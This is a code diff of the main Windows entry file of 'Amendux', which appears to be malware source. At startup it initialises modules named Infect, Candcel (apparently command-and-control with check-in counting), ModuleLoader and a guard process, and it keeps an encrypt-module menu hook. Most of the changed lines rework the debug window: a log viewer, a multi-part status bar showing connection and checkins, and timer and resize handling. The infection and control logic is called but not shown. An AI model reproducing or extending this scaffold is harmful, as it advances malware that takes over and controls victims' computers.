@@ -24,11 +24,8 @@
 #include "Candcel.h"
 #include "Infect.h"
 #include "ModuleLoader.h"
+#include "TaskQueue.h"
 #include "Resource.h"
-
-#if DEBUG
-#include <sodium.h>
-#endif
 
 #define MAX_LOADSTRING  100
 #define MUTEX           L"avcmtx"
@@ -40,6 +37,7 @@ HANDLE hMutex;									// Instance mutx lock
 
 // Forward declarations of functions included in this code module:
 ATOM                MainRegisterClass(HINSTANCE hInstance);
+HWND				CreateEditControl(HWND hwndParent, HMENU idStatus, HINSTANCE hinst);
 HWND				CreateStatusBar(HWND hwndParent, HMENU idStatus, HINSTANCE hinst, int cParts);
 UINT_PTR			CreateTimer(HWND hwndParent, UINT_PTR nEvent, UINT uSec);
 BOOL                InitInstance(HINSTANCE, int);
@@ -48,12 +46,11 @@ BOOL                ParseCommandLine();
 LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
 INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
 INT_PTR CALLBACK    Debug(HWND, UINT, WPARAM, LPARAM);
-#include "IRCClient.h"
+
 int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow)
 {
     UNREFERENCED_PARAMETER(hPrevInstance);
-	Amendux::IRCClient x;
-	x.Run();
+
 	// Parse commandline arguments
 	if (!ParseCommandLine()) {
 		return false;
@@ -76,22 +73,25 @@ int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmd
 	// Run core classes
 	Amendux::Infect::Init();
 	Amendux::Candcel::Init();
+	Amendux::TaskQueue::Init();
 	Amendux::ModuleLoader::Init();
 	Amendux::Process::Guard();
 
 	// Launch the threading processes
-	Amendux::Candcel::SpawnInterval(Amendux::Candcel::Current());
+	Amendux::Candcel::SpawnInterval();
 	Amendux::Process::SpawnGuardProcess();
+	Amendux::TaskQueue::SpawnTaskWorker();
 
 	// Main message loop
     MSG msg;
-    while (GetMessage(&msg, nullptr, 0, 0)) {
+    while (GetMessage(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
 
 	// Terminate modules in reverse order
 	Amendux::ModuleLoader::Terminate();
+	Amendux::TaskQueue::Terminate();
 	Amendux::Candcel::Terminate();
 	Amendux::Infect::Terminate();
 	Amendux::Config::Terminate();
@@ -142,7 +142,7 @@ ATOM MainRegisterClass(HINSTANCE hInstance)
     wcex.cbWndExtra     = 0;
     wcex.hInstance      = hInstance;
 	wcex.hIcon          = 0;
-    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
+    wcex.hCursor        = LoadCursor(NULL, IDC_ARROW);
     wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
     wcex.lpszMenuName   = MAKEINTRESOURCE(MAIN_MENU);
     wcex.lpszClassName  = WINUICLASS;
@@ -184,17 +184,23 @@ BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
 	// Main window
 	MainRegisterClass(hInstance);
 
-	HWND hWnd = CreateWindow(WINUICLASS, L"Amendux", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);
+	// Ensure that the common control DLL is loaded
+	InitCommonControls();
+
+	HWND hWnd = CreateWindow(WINUICLASS, L"Amendux", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, hInstance, NULL);
 	if (!hWnd) {
 		ReleaseMutex(hMutex);
 		return false;
 	}
 
-	// Set status bar
-	CreateStatusBar(hWnd, (HMENU)IDC_MAIN_STATUS, hInstance, 1);
+	// Main edito control
+	CreateEditControl(hWnd, (HMENU)IDC_MAIN_EDIT, hInstance);
 
-	// Set timer to 10 seconds
-	CreateTimer(hWnd, IDC_TIMER, 10);
+	// Set status bar
+	CreateStatusBar(hWnd, (HMENU)IDC_MAIN_STATUS, hInstance, 5);
+
+	// Set timer to 2 seconds
+	CreateTimer(hWnd, IDC_TIMER, 2);
 
 	ShowWindow(hWnd, nCmdShow);
 	UpdateWindow(hWnd);
@@ -317,6 +323,46 @@ done:
 
 #if DEBUG
 //
+//  FUNCTION: CreateEditControl(HWND, HMENU, HINSTANCE)
+//
+//  PURPOSE:  Creating main edit control
+//
+//
+HWND CreateEditControl(HWND hwndParent, HMENU idStatus, HINSTANCE hinst)
+{
+	RECT rcClient;
+
+	// Create the edit control
+	HWND hWndEdit = CreateWindowEx(WS_EX_CLIENTEDGE,
+		L"EDIT", (PCTSTR)NULL,
+		WS_CHILD | WS_VISIBLE | WS_VSCROLL | WS_HSCROLL | ES_MULTILINE | ES_AUTOVSCROLL | ES_AUTOHSCROLL | ES_READONLY,
+		0, 0, 0, 0,
+		hwndParent,
+		(HMENU)idStatus,
+		hinst,
+		NULL);
+
+	if (!hWndEdit) {
+		return hWndEdit;
+	}
+
+	// Windows GUI default font
+	HGDIOBJ hfDefault = GetStockObject(DEFAULT_GUI_FONT);
+
+	// Get the coordinates of the parent window's client area.
+	GetClientRect(hwndParent, &rcClient);
+
+	// Full window
+	SetWindowPos(hWndEdit, NULL, 0, 0, rcClient.right, rcClient.bottom - 23, SWP_NOZORDER);
+
+	// Set font
+	SendMessage(hWndEdit, WM_SETFONT, (WPARAM)hfDefault, MAKELPARAM(FALSE, 0));
+
+	return hWndEdit;
+}
+
+
+//
 //  FUNCTION: CreateStatusBar(HWND, HMENU, HINSTANCE, int)
 //
 //  PURPOSE:  Creating status bar
@@ -328,10 +374,7 @@ HWND CreateStatusBar(HWND hwndParent, HMENU idStatus, HINSTANCE hinst, int cPart
 {
 	RECT rcClient;
 
-	// Ensure that the common control DLL is loaded.
-	InitCommonControls();
-
-	// Create the status bar.
+	// Create the status bar
 	HWND hWndStatus = CreateWindowEx(0, STATUSCLASSNAME, (PCTSTR)NULL, WS_CHILD | WS_VISIBLE | SBARS_SIZEGRIP,
 		0, 0, 0, 0,
 		hwndParent,
@@ -343,15 +386,15 @@ HWND CreateStatusBar(HWND hwndParent, HMENU idStatus, HINSTANCE hinst, int cPart
 		return hWndStatus;
 	}
 
-	// Get the coordinates of the parent window's client area.
+	// Get the coordinates of the parent window's client area
 	GetClientRect(hwndParent, &rcClient);
 
-	// Allocate an array for holding the right edge coordinates.
+	// Allocate an array for holding the right edge coordinates
 	HLOCAL hloc = LocalAlloc(LHND, sizeof(int) * cParts);
 	PINT paParts = (PINT)LocalLock(hloc);
 
 	// Calculate the right edge coordinate for each part, and
-	// copy the coordinates to the array.
+	// copy the coordinates to the array
 	int nWidth = rcClient.right / cParts;
 	int rightEdge = nWidth;
 	for (int i = 0; i < cParts; i++) {
@@ -359,11 +402,13 @@ HWND CreateStatusBar(HWND hwndParent, HMENU idStatus, HINSTANCE hinst, int cPart
 		rightEdge += nWidth;
 	}
 
-	// Tell the status bar to create the window parts.
+	// Tell the status bar to create the window parts
 	SendMessage(hWndStatus, SB_SETPARTS, (WPARAM)cParts, (LPARAM)paParts);
 	SendMessage(hWndStatus, SB_SETTEXT, 0, (LPARAM)L"Initializing...");
+	//SendMessage(hWndStatus, SB_SETTEXT, 1, (LPARAM)L"Not connected");
+	SendMessage(hWndStatus, SB_SETTEXT, 2, (LPARAM)L"Not connected");
 	
-	// Free the array, and return.
+	// Free the array, and return
 	LocalUnlock(hloc);
 	LocalFree(hloc);
 	return hWndStatus;
@@ -401,7 +446,9 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 						DialogBox(hInst, MAKEINTRESOURCE(DIALOG_ABOUT), hWnd, About);
 						break;
 					case MENU_MOD_ENCRYPT:
-						// FileCrypt.Run();
+						break;
+					case ID_FILE_REFRESH:
+						RedrawWindow(hWnd, NULL, NULL, RDW_INVALIDATE | RDW_INTERNALPAINT);
 						break;
 					case MENU_FILE_DEBUG:
 						DialogBox(hInst, MAKEINTRESOURCE(DIALOG_DEBUG_LOG), hWnd, Debug);
@@ -425,32 +472,65 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 
 		case WM_PAINT: {
 				PAINTSTRUCT ps;
-				HDC hdc = BeginPaint(hWnd, &ps);
+				BeginPaint(hWnd, &ps);
 				
-				EndPaint(hWnd, &ps);
+				SendDlgItemMessage(hWnd, IDC_MAIN_STATUS, SB_SETTEXT, 0, (LPARAM)L"Running");
+				std::wstring title = L"Amendux (" + Amendux::Config::Current()->DisplayName() + L")";
 
-				std::wstring status = L"Running... [DEBUG]";
-				std::wstring tile = L"Amendux (" + Amendux::Config::Current()->DisplayName() + L") [DEBUG]";
-
-				status += L"[" + Amendux::Config::Current()->ModeName() + L"]";
-				tile += L"[" + Amendux::Config::Current()->ModeName() + L"]";
-
-				SetWindowText(hWnd, tile.c_str());
+				title += L"[" + Amendux::Config::Current()->ModeName() + L"]";
+				SetWindowText(hWnd, title.c_str());
+				SendDlgItemMessage(hWnd, IDC_MAIN_STATUS, SB_SETTEXT, 1, (LPARAM)Amendux::Config::Current()->ModeName().c_str());
 
 				if (Amendux::Candcel::Current()->IsConnected()) {
-					status += L"[CONNECTED][CHECKIN:" + std::to_wstring(Amendux::Candcel::Current()->CheckinCounter()) + L"]";
-					status += L"[GUARDED]";//TODO
+					SendDlgItemMessage(hWnd, IDC_MAIN_STATUS, SB_SETTEXT, 2, (LPARAM)L"Connected");
+					
+					std::wstring checkin = L"Checkins: " + std::to_wstring(Amendux::Candcel::Current()->CheckinCounter());
+					SendDlgItemMessage(hWnd, IDC_MAIN_STATUS, SB_SETTEXT, 3, (LPARAM)checkin.c_str());
 				}
 
-				SendDlgItemMessage(hWnd, IDC_MAIN_STATUS, SB_SETTEXT, 0, (LPARAM)status.c_str());
+				if (!Amendux::Config::Current()->CanGuardProcess()) {
+					SendDlgItemMessage(hWnd, IDC_MAIN_STATUS, SB_SETTEXT, 4, (LPARAM)L"Guarded");
+				}
+
+				EndPaint(hWnd, &ps);
 			}
 			break;
 
-		case WM_TIMER:
-			RedrawWindow(hWnd, NULL, NULL, RDW_INVALIDATE | RDW_INTERNALPAINT);
+		case WM_TIMER: {
+				SetDlgItemText(hWnd, IDC_MAIN_EDIT, Amendux::Log::Readback().c_str());
 
-		case WM_SIZE:
-			SendDlgItemMessage(hWnd, IDC_MAIN_STATUS, WM_SIZE, 0, 0);
+				RedrawWindow(hWnd, NULL, NULL, RDW_INVALIDATE | RDW_INTERNALPAINT);
+			}
+			break;
+
+		case WM_SIZE: {
+				RECT rcClient;
+
+				GetClientRect(hWnd, &rcClient);
+				SetWindowPos(GetDlgItem(hWnd, IDC_MAIN_EDIT), NULL, 0, 0, rcClient.right, rcClient.bottom - 23, SWP_NOZORDER);
+
+				// Allocate an array for holding the right edge coordinates
+				HLOCAL hloc = LocalAlloc(LHND, sizeof(int) * 5);
+				PINT paParts = (PINT)LocalLock(hloc);
+
+				// Calculate the right edge coordinate for each part, and
+				// copy the coordinates to the array
+				int nWidth = rcClient.right / 5;
+				int rightEdge = nWidth;
+				for (int i = 0; i < 5; i++) {
+					paParts[i] = rightEdge;
+					rightEdge += nWidth;
+				}
+
+				// Tell the status bar to create the window parts
+				SendMessage(GetDlgItem(hWnd, IDC_MAIN_STATUS), SB_SETPARTS, (WPARAM)5, (LPARAM)paParts);
+
+				// Free the array, and return
+				LocalUnlock(hloc);
+				LocalFree(hloc);
+
+				SendDlgItemMessage(hWnd, IDC_MAIN_STATUS, WM_SIZE, 0, 0);
+			}
 			break;
 
 		case WM_GETMINMAXINFO: {
@@ -484,7 +564,6 @@ INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
 	switch (message) {
 		case WM_INITDIALOG:
 			SetDlgItemText(hDlg, IDC_STATIC_VERSION, (L"Amendux, Version " + Amendux::Config::getVersion()).c_str());
-			SetDlgItemText(hDlg, IDC_STATIC_SODIUM, L"libsodium " SODIUM_VERSION_STRING);
 
 			return (INT_PTR)TRUE;
 
